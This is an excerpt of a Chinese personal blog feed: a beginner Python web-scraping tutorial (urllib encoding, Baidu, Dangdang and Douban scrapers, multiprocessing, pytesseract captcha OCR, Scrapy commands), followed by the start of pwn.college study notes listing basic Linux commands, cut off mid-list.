表示查询字符串的键，而“爬虫”则代表您输入的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from urllib import parse</span><br><span class="line">query_string = &#123;</span><br><span class="line">    &#x27;wd&#x27; : &#x27;爬虫&#x27;</span><br><span class="line">&#125;</span><br><span class="line"># 编码</span><br><span class="line">result = parse.urlencode(query_string)</span><br><span class="line"># 使用format函数拼接url地址</span><br><span class="line">url = &#x27;http://www.baidu.com/s?&#123;&#125;&#x27;.format(result)</span><br><span class="line">print(url)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.baidu.com/s?wd=%E7%88%AC%E8%99%AB</span><br></pre></td></tr></table></figure><h4 id="2-解码unquote-string"><a href="#2-解码unquote-string" class="headerlink" title="2) 解码unquote(string)"></a>2) 解码unquote(string)</h4><p>解码是对编码后的 URL 进行还原的一种操作，示例代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from urllib import parse</span><br><span class="line">string = &#x27;%E7%88%AC%E8%99%AB&#x27;</span><br><span class="line">result = parse.unquote(string)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>输出结果：</p><blockquote><p>爬虫</p></blockquote><h4 id="3-URL地址拼接方式"><a href="#3-URL地址拼接方式" class="headerlink" title="3) URL地址拼接方式"></a>3) URL地址拼接方式</h4><p>最后，给大家介绍三种拼接 URL 地址的方法。除了使用 format() 函数外，还可以使用字符串相加，以及字符串占位符，总结如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 1、字符串相加</span><br><span class="line">  baseurl = &#x27;http://www.baidu.com/s?&#x27;</span><br><span class="line">  params=&#x27;wd=%E7%88%AC%E8%99%AB&#x27;</span><br><span class="line">  url = baseurl + params</span><br><span class="line"># 2、字符串格式化（占位符）</span><br><span class="line">  params=&#x27;wd=%E7%88%AC%E8%99%AB&#x27;</span><br><span class="line">  url = &#x27;http://www.baidu.com/s?%s&#x27;% params</span><br><span class="line"># 3、format()方法</span><br><span class="line">  url = &#x27;http://www.baidu.com/s?&#123;&#125;&#x27;</span><br><span class="line">  params=&#x27;wd=%E7%88%AC%E8%99%AB&#x27;</span><br><span class="line">  url = url.format(params)</span><br></pre></td></tr></table></figure><h2 id="Python爬虫抓取网页"><a href="#Python爬虫抓取网页" class="headerlink" title="Python爬虫抓取网页"></a>Python爬虫抓取网页</h2><p>首先我们对要编写的爬虫程序进行简单地分析，该程序可分为以下三个部分：</p><ul><li>拼接 url 地址</li><li>发送请求</li><li>将照片保存至本地</li></ul><h3 id="导入所需模块"><a href="#导入所需模块" class="headerlink" title="导入所需模块"></a>导入所需模块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from urllib import parse</span><br><span class="line">from urllib import request</span><br><span class="line">from fake_useragent import UserAgent</span><br></pre></td></tr></table></figure><h3 id="拼接URL地址"><a href="#拼接URL地址" class="headerlink" title="拼接URL地址"></a>拼接URL地址</h3><p>定义 URL 变量，拼接 url 地址。代码如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一、 拼接 URL 地址</span></span><br><span class="line">query_string = &#123;</span><br><span class="line">    <span class="string">&#x27;wd&#x27;</span> : <span class="string">&#x27;杀戮天使&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 编码</span></span><br><span class="line">result = parse.urlencode(query_string)</span><br><span class="line"><span class="comment"># 使用format函数拼接url地址</span></span><br><span class="line">url = <span class="string">&#x27;http://www.baidu.com/s?&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(result)</span><br></pre></td></tr></table></figure><h3 id="向URL发送请求"><a href="#向URL发送请求" class="headerlink" title="向URL发送请求"></a>向URL发送请求</h3><p>发送请求主要分为以下几个步骤：</p><ul><li>创建请求对象-Request</li><li>获取响应对象-urlopen</li><li>获取响应内容-read</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 二、 向 URL 发送请求</span></span><br><span class="line"><span class="comment"># 1. 重构请求头</span></span><br><span class="line">ua = UserAgent()</span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span> : ua.edge&#125;</span><br><span class="line"><span class="comment"># 2. 创建请求对应</span></span><br><span class="line">req = request.Request(url=url, headers = headers)</span><br><span class="line"><span class="comment"># 3. 获取响应对象</span></span><br><span class="line">res = request.urlopen(req)</span><br><span class="line"><span class="comment"># 4. 获取响应内容</span></span><br><span class="line">html = res.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="保存为本地文件"><a href="#保存为本地文件" class="headerlink" title="保存为本地文件"></a>保存为本地文件</h3><p>把爬取的照片保存至本地，此处需要使用 Python 编程的文件 IO 操作，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 三、保存文件至当前目录</span><br><span class="line">filename =  &#x27;杀戮天使.html&#x27;</span><br><span class="line">with open(filename,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">    f.write(html)</span><br></pre></td></tr></table></figure><h3 id="总代码"><a href="#总代码" class="headerlink" title="总代码"></a>总代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from urllib import parse</span><br><span class="line">from urllib import request</span><br><span class="line">from fake_useragent import UserAgent</span><br><span class="line"></span><br><span class="line"># 一、 拼接 URL 地址</span><br><span class="line">query_string = &#123;</span><br><span class="line">    &#x27;wd&#x27; : &#x27;杀戮天使&#x27;</span><br><span class="line">&#125;</span><br><span class="line"># 编码</span><br><span class="line">result = parse.urlencode(query_string)</span><br><span class="line"># 使用format函数拼接url地址</span><br><span class="line">url = &#x27;https://www.baidu.com/s?&#123;&#125;&#x27;.format(result)</span><br><span class="line"></span><br><span class="line"># 二、 向 URL 发送请求</span><br><span class="line"># 1. 重构请求头</span><br><span class="line">ua = UserAgent()</span><br><span class="line">headers = &#123;&#x27;User-Agent&#x27; : ua.edge&#125;</span><br><span class="line"># 2. 创建请求对应</span><br><span class="line">req = request.Request(url=url, headers = headers)</span><br><span class="line"># 3. 获取响应对象</span><br><span class="line">res = request.urlopen(req)</span><br><span class="line"># 4. 获取响应内容</span><br><span class="line">html = res.read().decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line"># 三、保存文件至当前目录</span><br><span class="line">filename =  &#x27;杀戮天使.html&#x27;</span><br><span class="line">with open(filename,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">    f.write(html)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="实战（当当网）"><a href="#实战（当当网）" class="headerlink" title="实战（当当网）"></a>实战（当当网）</h2><p><a href="http://bang.dangdang.com/books/fivestars/01.00.00.00.00.00-recent30-0-0-1-1">http://bang.dangdang.com/books/fivestars/01.00.00.00.00.00-recent30-0-0-1-1</a></p><p>从1到25页的图书名称</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过页面url信息可以发现url组成</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_url</span>(<span class="params">page</span>):</span><br><span class="line">    url = <span class="string">&quot;http://bang.dangdang.com/books/fivestars/01.00.00.00.00.00-recent30-0-0-1-&quot;</span> + <span class="built_in">str</span>(page)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对当当网的请求</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_dangdang</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># 重构请求头</span></span><br><span class="line">    ua = UserAgent()</span><br><span class="line">    headers = &#123;<span class="string">&quot;User-Agent&quot;</span> : ua.random&#125;</span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="comment"># 如果状态码为200，请求成功</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="comment"># 返回网页源代码</span></span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将信息写入文件中</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_write</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./book.txt&quot;</span>, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    f.write(<span class="built_in">str</span>)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析获取到的源码信息</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info_parse</span>(<span class="params">html</span>):</span><br><span class="line">    <span class="comment"># 可以上网查询一下使用方法</span></span><br><span class="line">    <span class="comment"># 使用BeautifulSoup库， html 代表需要解析的源代码， &#x27;html.parser&#x27;是解析器</span></span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    <span class="comment"># 找到所有的class == name的div标签，存入list</span></span><br><span class="line">    div_name = soup.find_all(class_= <span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="comment"># 对list中的每一个div标签, 提取其中的a标签的内容</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> div_name:</span><br><span class="line">        <span class="comment"># 提取出名字</span></span><br><span class="line">        a_content = item.a.text</span><br><span class="line">        <span class="comment"># 加上换行符写入文件中去</span></span><br><span class="line">        a_content += <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">        file_write(a_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">26</span>):</span><br><span class="line">        url = get_url(page)</span><br><span class="line">        <span class="comment"># 提取网页源码</span></span><br><span class="line">        html = request_dangdang(url)</span><br><span class="line">        <span class="comment"># 提取需要的信息</span></span><br><span class="line">        info_parse(html)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="实战（豆瓣）"><a href="#实战（豆瓣）" class="headerlink" title="实战（豆瓣）"></a>实战（豆瓣）</h2><p><a href="https://movie.douban.com/top250?start=100&filter=">https://movie.douban.com/top250?start=100&amp;filter=</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_url</span>(<span class="params">page</span>):</span><br><span class="line">    url = <span class="string">&quot;https://movie.douban.com/top250?start=&quot;</span> + <span class="built_in">str</span>(page)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_src_code</span>(<span class="params">url</span>):</span><br><span class="line">    ua = UserAgent()</span><br><span class="line">    headers = &#123;<span class="string">&quot;User-Agent&quot;</span> : ua.random&#125;</span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info_parse</span>(<span class="params">html</span>):</span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    <span class="built_in">list</span> = soup.find(class_=<span class="string">&#x27;grid_view&#x27;</span>).find_all(<span class="string">&#x27;li&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        item_name = item.find(class_=<span class="string">&#x27;title&#x27;</span>).string</span><br><span class="line">        item_img = item.find(<span class="string">&#x27;a&#x27;</span>).find(<span class="string">&#x27;img&#x27;</span>).get(<span class="string">&quot;src&quot;</span>)</span><br><span class="line">        item_index = item.find(class_=<span class="string">&quot;&quot;</span>).string</span><br><span class="line">        item_score = item.find(class_=<span class="string">&quot;rating_num&quot;</span>).string</span><br><span class="line">        <span class="keyword">if</span> item.find(class_=<span class="string">&#x27;inq&#x27;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            item_inq = item.find(class_=<span class="string">&#x27;inq&#x27;</span>).string</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            item_inq = <span class="string">&quot;NOT AVAILABLE&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(item_index + <span class="string">&quot;|&quot;</span> + item_name + <span class="string">&quot;|&quot;</span> + item_score + <span class="string">&quot;|&quot;</span> + item_inq)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    page = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">250</span>, <span class="number">25</span>):</span><br><span class="line">        url = get_url(page)</span><br><span class="line">        html = get_src_code(url)</span><br><span class="line">        info_parse(html)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h2><p><a href="https://zhuanlan.zhihu.com/p/64702600">一篇文章搞定Python多进程(全) - 知乎 (zhihu.com)</a></p><p>我们通过多开进程处理同一个程序使得运行时间缩短，在上面的代码中，我们将<code>get_src_code(url)</code>和<code>info_parse(html)</code>封装为<code>handle(url)</code>，这样我们就可以开多个进程，每个进程都执行handle函数，把所有的url分配给这5个进程，这5个进程同时执行，就缩短了执行时间。单进程（约4秒）–&gt; 多进程（约1秒）</p><p>下面是修改后的豆瓣代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_url</span>(<span class="params">page</span>):</span><br><span class="line">    url = <span class="string">&quot;https://movie.douban.com/top250?start=&quot;</span> + <span class="built_in">str</span>(page)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_src_code</span>(<span class="params">url</span>):</span><br><span class="line">    ua = UserAgent()</span><br><span class="line">    headers = &#123;<span class="string">&quot;User-Agent&quot;</span> : ua.random&#125;</span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info_parse</span>(<span class="params">html</span>):</span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    <span class="built_in">list</span> = soup.find(class_=<span class="string">&#x27;grid_view&#x27;</span>).find_all(<span class="string">&#x27;li&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        item_name = item.find(class_=<span class="string">&#x27;title&#x27;</span>).string</span><br><span class="line">        item_img = item.find(<span class="string">&#x27;a&#x27;</span>).find(<span class="string">&#x27;img&#x27;</span>).get(<span class="string">&quot;src&quot;</span>)</span><br><span class="line">        item_index = item.find(class_=<span class="string">&quot;&quot;</span>).string</span><br><span class="line">        item_score = item.find(class_=<span class="string">&quot;rating_num&quot;</span>).string</span><br><span class="line">        <span class="keyword">if</span> item.find(class_=<span class="string">&#x27;inq&#x27;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            item_inq = item.find(class_=<span class="string">&#x27;inq&#x27;</span>).string</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            item_inq = <span class="string">&quot;NOT AVAILABLE&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(item_index + <span class="string">&quot;|&quot;</span> + item_name + <span class="string">&quot;|&quot;</span> + item_score + <span class="string">&quot;|&quot;</span> + item_inq)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">url</span>):</span><br><span class="line">    html = get_src_code(url)</span><br><span class="line">    info_parse(html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    startTime = time.time()</span><br><span class="line"></span><br><span class="line">    urls = []</span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">250</span>, <span class="number">25</span>):</span><br><span class="line">        url = get_url(page)</span><br><span class="line">        urls.append(url)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 多进程爬取</span></span><br><span class="line">    pool = Pool(<span class="number">5</span>)</span><br><span class="line">    pool.<span class="built_in">map</span>(handle, urls)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    <span class="comment"># handle()</span></span><br><span class="line">    endTime = time.time()</span><br><span class="line">    dTime = endTime - startTime</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;运行时间： %s s&quot;</span> % dTime)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="图片验证码（pytesseract）"><a href="#图片验证码（pytesseract）" class="headerlink" title="图片验证码（pytesseract）"></a>图片验证码（pytesseract）</h2><p><a href="https://vip.fxxkpython.com/?p=4848">python爬虫20 | 小帅b教你如何识别图片验证码 – 通往Python高手之路 (fxxkpython.com)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入相关模块</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">captcha = Image.open(&quot;captcha1.png&quot;)</span><br><span class="line"># 图片识别为字符串</span><br><span class="line">result = pytesseract.image_to_string(captcha)</span><br><span class="line"># 图片进行灰度处理</span><br><span class="line">result = captcha.convert(&#x27;L&#x27;)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><h2 id="Scrapy框架的使用"><a href="#Scrapy框架的使用" class="headerlink" title="Scrapy框架的使用"></a>Scrapy框架的使用</h2><p><a href="https://www.bilibili.com/video/BV1ha4y1H7sx?p=60&vd_source=a87fbd3945da4b0dcfade345051aeae4">Day8 - 3.scrapy基本使用_哔哩哔哩_bilibili</a></p><ol><li><p><strong>创建一个工程</strong>: scrapy startproject xxxxx</p></li><li><p><strong>在spiders子目录中创建一个爬虫文件</strong></p><p>​scrapy genspider xxxx(name) <a href="http://www.xxx.com(url)/">www.xxx.com(url)</a></p></li><li><p><strong>执行工程</strong>: </p><p>​scrapy crawl xxxx(name)</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://c.biancheng.net/python_spider/useragent-pool.html&quot;&gt;构建User-Agnet代理池 (biancheng.net)&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;爬虫&quot;&gt;&lt;a href=&quot;#爬虫&quot; cla</summary>
      
    
    
    
    <category term="python" scheme="https://1xueyu1.github.io/categories/python/"/>
    
    <category term="爬虫" scheme="https://1xueyu1.github.io/categories/python/%E7%88%AC%E8%99%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>pwn_college</title>
    <link href="https://1xueyu1.github.io/2024/01/17/pwn-college/"/>
    <id>https://1xueyu1.github.io/2024/01/17/pwn-college/</id>
    <published>2024-01-17T14:22:05.000Z</published>
    <updated>2024-02-19T09:12:31.556Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://tech.c01dkit.com/pwn-college-cse365-spring2023/#building-a-web-server">https://tech.c01dkit.com/pwn-college-cse365-spring2023/#building-a-web-server</a></p><h1 id="Program-Misuse"><a href="#Program-Misuse" class="headerlink" title="Program Misuse"></a>Program Misuse</h1><p><strong><a href="https://github.com/J-shiro/J-shiro.github.io/blob/master/content/post/english/pwn_college/module1/index.md">解答1</a><a href="https://tech.c01dkit.com/">解答2</a></strong></p><h2 id="Linux-Command"><a href="#Linux-Command" class="headerlink" title="Linux Command"></a>Linux Command</h2><p>① <strong>Learning the command line</strong></p><ol><li><p><a href="https://overthewire.org/wargames/bandit/">Bandit</a></p></li><li><p><code>cat</code>: 用于连接文件并打印到标准输出设备上。</p><ul><li><strong>-n 或 –number</strong>：由 1 开始对所有输出的行数编号。</li><li><strong>-b 或 –number-nonblank</strong>：和 -n 相似，只不过对于空白行不编号。</li></ul></li><li><p><code>more</code>: 以一页一页的形式显示</p></li><li><p><code>less</code>: 和 more 类似</p></li><li><p><code>head</code>: 命令可用于查看文件的开头部分的内容，有一个常用的参数 <strong>-n</strong> 用于显示行数，默认为 10，即显示 10 行的内容。</p></li><li><p><code>tail</code>: 与 head 相反</p></li><li><p><code>sort</code>: 用于将文本文件内容加以排序。</p><ul><li>-r : 反序</li></ul></li><li><p><code>rev</code>（reverse）用于将文件中的每行内容以字符为单位反序输出，即第一个字符最后输出，最后一个字符最先输出，以此类推。</p></li><li><p><code>od</code>指令会读取所给予的文件的内容，并将其内容以八进制字码呈现出来。</p><ul><li><pre><code>-b:octal-x -h:hex-c:ASCII-d:Decimal(ten)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">10. **`hd`** : hexdump, mainly used to view the **hexadecimal encoding** of **Binary files**.</span><br><span class="line"></span><br><span class="line">11. `xxd`: Convert any file to **hexadecimal** or binary(-b) form</span><br><span class="line"></span><br><span class="line">12. `base32/base64` base32 [op] [file] 编码, -d 解码</span><br><span class="line"></span><br><span class="line">13. `split`该指令将大文件分割成较小的文件，在默认情况下将按照每1000行切割成一个小文件。</span><br><span class="line"></span><br><span class="line">    - ```</span><br><span class="line">      split [--help][--version][-&lt;行数&gt;][-b &lt;字节&gt;][-C &lt;字节&gt;][-l &lt;行数&gt;][要切割的文件][输出文件名]</span><br></pre></td></tr></table></figure></code></pre></li><li><p>-&lt;行数&gt; : 指定每多少行切成一个小文件</p></li><li><p>-b&lt;字节&gt; : 指定每多少字节切成一个小文件</p></li><li><p>[输出文件名] : 设置切割后文件的前置文件名， split会自动在前置文件名后再加上编号</p></li></ul></li><li><p><code>gzip</code>是个使用广泛的压缩程序，文件经它压缩过后，其名称后面会多出”.gz”的扩展名。</p><ul><li>-c或–stdout或–to-stdout 　把压缩后的文件输出到标准输出设备，不去更动原始文件。</li><li>-f或–force 　